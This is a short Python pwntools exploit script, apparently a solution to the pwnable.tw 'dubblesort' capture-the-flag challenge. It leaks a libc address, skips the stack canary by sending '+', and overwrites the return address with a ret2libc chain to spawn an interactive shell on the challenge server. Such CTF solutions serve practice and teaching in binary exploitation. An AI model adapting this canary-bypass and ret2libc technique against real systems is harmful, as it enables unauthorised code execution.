from pwn import *

#r = process(['/glibc/2.23/32/lib/ld-2.23.so','./dubblesort'], env={'LD_PRELOAD':'./libc_32.so.6'})

r = remote('chall.pwnable.tw',10101)

ret = 33

canary = 25

libc_system_offset = 0x3a940

libc_base_offset = 0x1b0000

libc_binsh_offset = 0x158e8b

r.sendline('a'*24)

leak = u32(r.recvuntil(',').strip(',')[46:50])

leak = leak - 0x0a

print(hex(leak))

libc_base = leak - libc_base_offset

libc_system = int(libc_base + libc_system_offset)

libc_binsh = int(libc_base + libc_binsh_offset)

r.sendline('35')

for i in range(24):
    r.sendline('1')

r.sendline('+')

num = -294967295

for i in range(7):
    r.sendline(str(num))
    num = num-1

r.sendline(str(libc_system))

r.sendline(str(libc_system+1))

r.sendline(str(libc_binsh))

r.interactive()
